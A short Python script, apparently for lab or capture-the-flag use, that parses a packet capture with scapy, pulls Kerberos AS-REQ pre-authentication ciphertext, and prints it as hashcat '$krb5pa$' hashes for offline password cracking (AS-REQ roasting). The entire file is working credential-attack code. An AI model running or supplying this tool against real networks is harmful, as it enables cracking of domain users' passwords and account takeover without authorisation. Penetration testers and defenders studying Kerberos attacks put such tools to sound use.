#!/usr/bin/python3

import sys
from scapy.all import *
from binascii import hexlify



# Check CL arguments.
if len(sys.argv) < 3:
    print("Usage: as_req_roast.py [pcap file] [FQDN]")
    exit(0)



def parse_packet(packet,FQDN,pcapfile):
    # Check if destiniation port is for Kerberos protocol.
    if packet.dport == 88 or packet.dport == "kerberos":
        msgType = bytes(packet[Kerberos][KRB_AS_REQ].msgType)[-1:].decode()

        # Ensure msgType is \x0a which is krb_as_req.
        if msgType != '\n': return

        # If packet is after response KRB5KDC_ERR_PREAUTH_REQUIRED:
        if packet[Kerberos] and packet[Kerberos][PADATA].padataValue.cipher:
            data = packet[Kerberos]

            # Need to elaborate on this; only checks for encType 12 (AES256).
            enctype = bytes(data[EncryptedData].etype)[-1:].decode()
            if enctype == '\x12':
                encryption = 18

            # Get samaccountname of trustee.
            nameString = bytes(data[KRB_KDC_REQ_BODY][PrincipalName].nameString[0])[2:].decode()

            # Some Kerberos clients append root domain already; make sure there's no duplicate.
            domain = bytes(data[KRB_KDC_REQ_BODY ].realm)[2:].decode()
            try:
                if len(domain.split('.')[0:-1]) == 0:
                    pass
                else:
                    domain = domain.split('.')[0:-1]
            except:
                pass
            
            # Ensure proper format to avoid errors in cracking.
            if type(domain) == list: full_domain = '.'.join(domain) + "." + FQDN
            else: full_domain = domain + "." + FQDN
            
            # Extract cipher text.
            cipher = hexlify(bytes(data[PADATA].padataValue.cipher)[2:]).decode()

            # Concat hashcat format for cracking.
            hashcat_format = "$krb5pa$" + f"{encryption}$" + f"{nameString}$" + f"{full_domain.upper()}$" + cipher
            
            return hashcat_format
            


def main():
    # Load pcap file.
    pcapfile = rdpcap(f"{sys.argv[1]}")

    # Take root of Domain name i.e. ".local" or ".htb".
    FQDN = str(sys.argv[2]).split('.')[-1:][0]
    
    sessions = pcapfile.sessions()

    for session in sessions:
        for packet in sessions[session]:
            try:
                is_done = parse_packet(packet,FQDN,pcapfile)
                if is_done and is_done != None:
                    print(is_done)
            except: 
                pass



if __name__ == "__main__":
    main()
